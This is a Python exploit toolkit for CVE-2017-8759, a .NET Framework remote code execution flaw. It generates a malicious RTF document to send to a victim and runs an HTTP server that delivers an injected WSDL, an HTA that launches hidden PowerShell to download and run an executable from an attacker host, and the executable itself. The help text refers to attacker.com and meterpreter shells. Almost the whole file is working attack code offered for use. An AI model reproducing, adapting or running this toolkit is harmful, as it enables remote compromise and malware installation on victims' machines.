#!/usr/bin/env python
'''

                                                        ## Exploit toolkit CVE-2017-8759 - v1.0 (https://github.com/bhdresh/CVE-2017-8759) ##

'''
import os,sys,thread,socket,sys,getopt,binascii,shutil,tempfile
from random import randint
from random import choice
from string import ascii_uppercase
from zipfile import ZipFile, ZIP_STORED, ZipInfo


BACKLOG = 50            # how many pending connections queue will hold
MAX_DATA_RECV = 999999  # max number of bytes we receive at once
DEBUG = True            # set to True to see the debug msgs
def main(argv):
    # Host and Port information
    global port
    global host
    global filename
    global docuri
    global payloadurl
    global payloadlocation
    global custom
    global mode
    global obfuscate
    global payloadtype
    filename = ''
    docuri = ''
    payloadurl = ''
    payloadlocation = ''
    custom = ''
    port = int("80")
    host = ''
    mode = ''
    obfuscate = int("0")
    payloadtype = 'rtf'

    # Capture command line arguments
    try:
        opts, args = getopt.getopt(argv,"hM:w:u:p:e:l:H:x:t:",["mode=","filename=","docuri=","port=","payloadurl=","payloadlocation=","custom=","obfuscate=","payloadtype="])
    except getopt.GetoptError:
        print 'Usage: python '+sys.argv[0]+' -h'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
                print "\nThis is a handy toolkit to exploit CVE-2017-8759 (Microsoft .NET Framework RCE)\n"
                print "Modes:\n"
                print " -M gen                                          Generate Malicious file only\n"
                print "             Generate malicious payload:\n"
                print "             -w <Filename.rtf>                   Name of malicious RTF file (Share this file with victim).\n"
                print "             -u <http://attacker.com/test.txt>   Path of remote txt file. Normally, this should be a domain or IP where this tool is running.\n"
		print "                                                 For example, http://attacker.com/test.txt (This URL will be included in malicious file and\n"
                print "                                                 will be requested once victim will open malicious RTF file.\n"
                print " -M exp                                          Start exploitation mode\n"
                print "             Exploitation:\n"
		print "             -p <TCP port:Default 80>            Local port number.\n"
                print "             -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.\n"
                print "             -l </tmp/shell.exe>                 Specify local path of an executable file / meterpreter shell / payload.\n"
                sys.exit()
        elif opt in ("-M","--mode"):
            mode = arg
        elif opt in ("-w", "--filename"):
            filename = arg
        elif opt in ("-u", "--docuri"):
            docuri = arg
        elif opt in ("-p", "--port"):
            port = int(arg)
        elif opt in ("-e", "--payloadurl"):
            payloadurl = arg
        elif opt in ("-l", "--payloadlocation"):
            payloadlocation = arg
    if "gen" in mode:
        if (len(filename)<1):
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        if (len(docuri)<1):
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        print "Generating normal RTF payload.\n"
        generate_exploit_rtf()
        sys.exit()
        mode = 'Finished'
    if "exp" in mode:
	
        if (len(payloadurl)<1):
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        if (len(payloadurl)>1 and len(payloadlocation)<1):
            print "Running exploit mode (Deliver HTA with remote payload) - waiting for victim to connect"
            exploitation_rtf()
            mode = 'Finished'
            sys.exit()
        if (len(payloadurl)>1 and len(payloadlocation)>1):
            print "Running exploit mode (Deliver HTA + Local Payload) - waiting for victim to connect"
            exploitation_rtf()
            mode = 'Finished'
        if not "Finished" in mode:
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
def generate_exploit_rtf():
    # Preparing malicious RTF
    s = docuri
    docuri_hex = "00".join("{:02x}".format(ord(c)) for c in s)
    docuri_pad_len = 714 - len(docuri_hex)
    docuri_pad = "0"*docuri_pad_len
    payload = "{\\rtf1\\adeflang1025\\ansi\\ansicpg1252\\uc1\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi31507\\deflang1033\\deflangfe2052\\themelang1033\\themelangfe2052\\themelangcs0\n"
    payload += "{\\info\n"
    payload += "{\\author }\n"
    payload += "{\\operator }\n"
    payload += "}\n"
    payload += "{\\*\\xmlnstbl {\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}\n"
    payload += "{\n"
    payload += "{\\object\\objautlink\\objupdate\\rsltpict\\objw291\\objh230\\objscalex99\\objscaley101\n"
    payload += "{\\*\\objclass Word.Document.8}\n"
    payload += "{\\*\\objdata 010500000200000008000000e2bae4e53e2231000000000000000000000a0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdfffffffefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff010000000003000000000000c000000000000046000000000000000000000000f02c1951c8e5d20103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000d8010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000020000000300000004000000050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0100000209000000010000000000000000000000000000008c010000c7b0abec197fd211978e0000f8757e2a00000000700100007700730064006c003d00"+docuri_hex+docuri_pad+"00ffffffff0000000000000000000000000000000000000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000}\n"
    payload += "{\\result {\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0 \\insrsid1979324 }}}}\n"
    payload += "{\\*\\datastore }\n"
    payload += "}\n"
    f = open(filename, 'w')
    f.write(payload)
    f.close()
    print "Generated "+filename+" successfully"

def exploitation_rtf():
 
    print "Server Running on ",host,":",port

    try:
        # create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # associate the socket to host and port
        s.bind((host, port))

        # listenning
        s.listen(BACKLOG)
    
    except socket.error, (value, message):
        if s:
            s.close()
        print "Could not open socket:", message
        sys.exit(1)

    # get the connection from client
    while 1:
        conn, client_addr = s.accept()

        # create a thread to handle request
        thread.start_new_thread(server_thread, (conn, client_addr))
        
    s.close()

def server_thread(conn, client_addr):

    # get the request from browser
    try:
        request = conn.recv(MAX_DATA_RECV)
        if (len(request) > 0):
            # parse the first line
            first_line = request.split('\n')[0]
            
            # get method
            method = first_line.split(' ')[0]
            try:
                url = first_line.split(' ')[1]
            except IndexError:
                print "Invalid request from "+client_addr[0]
                conn.close()
                sys.exit(1)
 		
            if ".exe" in url:
                print "Received request for payload from "+client_addr[0]
                try:
                    size = os.path.getsize(payloadlocation)
                except OSError:
                    print "Unable to read "+payloadlocation
                    conn.close()
                    sys.exit(1)
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 18:56:41 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 16:56:22 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: "+str(size)+"\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/x-msdos-program\r\n\r\n"
                with open(payloadlocation) as fin:
                    data +=fin.read()
                    conn.send(data)
                    conn.close()
                    sys.exit(1)
            if ".hta" in url:
                print "Received GET method from "+client_addr[0]
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 17:11:03 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 17:30:47 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: 315\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/hta\r\n\r\n<script>\na=new ActiveXObject(\"WScript.Shell\");\na.run('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\\'"+payloadurl+"\\', \\'c:/windows/temp/shell.exe\\'); c:/windows/temp/shell.exe', 0);window.close();\n</script>\r\n"
                conn.send(data)
                conn.close()
            if ".txt" in url:
                print "Received GET method from "+client_addr[0]
                data = 'HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 17:11:03 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 17:30:47 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: 2000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/plain\r\n\r\n<definitions\n    xmlns="http://schemas.xmlsoap.org/wsdl/"\n    xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"\n    xmlns:suds="http://www.w3.org/2000/wsdl/suds"\n    xmlns:tns="http://schemas.microsoft.com/clr/ns/System"\n     xmlns:ns0="http://schemas.microsoft.com/clr/nsassem/Logo/Logo">\n    <portType name="PortType"/>\n    <binding name="Binding" type="tns:PortType">\n        <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>\n        <suds:class type="ns0:Image" rootType="MarshalByRefObject"></suds:class>\n      </binding>\n      <service name="Service">\n        <port name="Port" binding="tns:Binding">\n            <soap:address location="'+payloadurl.split(':')[0]+"://"+payloadurl.split('/')[2]+'?C:\Windows\System32\mshta.exe?'+payloadurl.split(':')[0]+"://"+payloadurl.split('/')[2]+'/cmd.hta"/>\n                        <soap:address location=";\n                        if (System.AppDomain.CurrentDomain.GetData(_url.Split(\'?\')[0]) == null) {\n                                System.Diagnostics.Process.Start(_url.Split(\'?\')[1], _url.Split(\'?\')[2]);\n                                System.AppDomain.CurrentDomain.SetData(_url.Split(\'?\')[0], true);\n                        } //"/>\n        </port>\n    </service>\n</definitions>\n'
                conn.send(data)
                conn.close()    
                sys.exit(1)
    except socket.error, ex:
        print ex

if __name__ == '__main__':
    main(sys.argv[1:])
